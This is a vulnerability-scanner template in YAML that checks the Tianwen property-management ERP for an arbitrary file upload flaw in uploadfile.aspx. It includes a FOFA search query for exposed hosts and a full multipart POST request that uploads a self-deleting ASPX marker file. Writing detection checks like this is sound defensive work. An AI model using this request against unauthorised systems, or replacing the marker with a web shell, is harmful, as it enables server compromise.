expression: r0()
id: tianwenwuye-erp-uploadfile-aspx-anyfile-upload
info:
  author: daffainfo
  description: "\u6210\u90FD\u5929\u95EE\u4E92\u8054\u79D1\u6280\u6709\u9650\u516C\
    \u53F8\u4EE5\u8F6F\u4EF6\u5F00\u53D1\u548C\u6280\u672F\u670D\u52A1\u4E3A\u57FA\
    \u7840\uFF0C\u5EFA\u7ACB\u7269\u4E1AERP\u5E94\u7528\u7CFB\u7EDF\uFF0C\u5411\u7269\
    \u7BA1\u516C\u53F8\u63D0\u4F9B\u65E8\u5728\u964D\u4F4E\u6210\u672C\u3001\u4FDD\
    \u969C\u54C1\u8D28\u3001\u63D0\u5347\u6548\u80FD\u4E3A\u76EE\u6807\u7684\u667A\
    \u6167\u7269\u7BA1\u6574\u4F53\u89E3\u51B3\u65B9\u6848\uFF0C\u5B9E\u73B0\u7269\
    \u7BA1\u516C\u53F8\u7684\u7BA1\u7406\u5347\u7EA7\uFF1B\u4EE5\u5E73\u53F0\u642D\
    \u5EFA\u548C\u8D44\u6E90\u6574\u5408\u4E3A\u57FA\u7840\uFF0C\u5EFA\u7ACB\u793E\
    \u533AO2O\u670D\u52A1\u5E73\u53F0\uFF0C\u5411\u7269\u7BA1\u516C\u53F8\u63D0\u4F9B\
    \u65E8\u5728\u5B8C\u5584\u670D\u52A1\u3001\u65B9\u4FBF\u4E1A\u4E3B\u3001\u589E\
    \u52A0\u6536\u76CA\u4E3A\u76EE\u6807\u7684\u667A\u6167\u5C0F\u533A\u7EFC\u5408\
    \u670D\u52A1\u5E73\u53F0\uFF0C\u5B9E\u73B0\u7269\u4E1A\u516C\u53F8\u7684\u670D\
    \u52A1\u8F6C\u578B\u3002\u5929\u95EE\u7269\u4E1AERP\u7CFB\u7EDF uploadfile.aspx\u5B58\
    \u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\
    \u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\u81F3\
    \u670D\u52A1\u5668\uFF0C\u5BFC\u81F4\u670D\u52A1\u5668\u5931\u9677\u3002\nfofa-query:\
    \ body=\"\u5929\u95EE\u7269\u4E1AERP\u7CFB\u7EDF\"\n"
  name: "\u5929\u95EE\u7269\u4E1AERP\u7CFB\u7EDF uploadfile.aspx \u4EFB\u610F\u6587\
    \u4EF6\u4E0A\u4F20\u6F0F\u6D1E"
  reference:
  - https://www.s9h.cn/5800.html
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes('/HM/M_Main/OAUpLoadFile/'+datepath))
    request:
      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"__VIEWSTATE\"\r\n\r\n/wEPDwUKLTg1NDU3MTA4OQ9kFgICAQ8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk70CKfgUcso35StfmoNB/ObwwU8W4qvmgqa52HxmqsU0=\r\
        \n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"__VIEWSTATEGENERATOR\"\r\n\r\nDE1005D5\r\n------WebKitFormBoundary{{rboundary}}\r\
        \nContent-Disposition: form-data; name=\"__EVENTVALIDATION\"\r\n\r\n/wEdAAIk02sIXo/TRIPUygBB64GvmW/ynBkkkA2xI95ik8Vs4GXPPWvIYnA84468jdc5Wr+nrufsSY+RKtcm7vKIotDs\r\
        \n------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"BtnSave\"\r\n\r\n\u786E\u5B9A\u4E0A\u4F20\r\n------WebKitFormBoundary{{rboundary}}\r\
        \nContent-Disposition: form-data; name=\"upload_img\"; filename=\"1.aspx\"\
        \r\nContent-Type: application/octet-stream\r\n\r\n<%@Page Language=\"C#\"\
        %>\r\n<%Response.Write(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"\
        MHhvbGQ2\"))); System.IO.File.Delete(Request.PhysicalPath);%>\r\n\r\n------WebKitFormBoundary{{rboundary}}"
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      method: POST
      path: /HM/M_Main/uploadfile.aspx
set:
  datepath: year(0) + "/" + month(0)
  rboundary: randomLowercase(8)
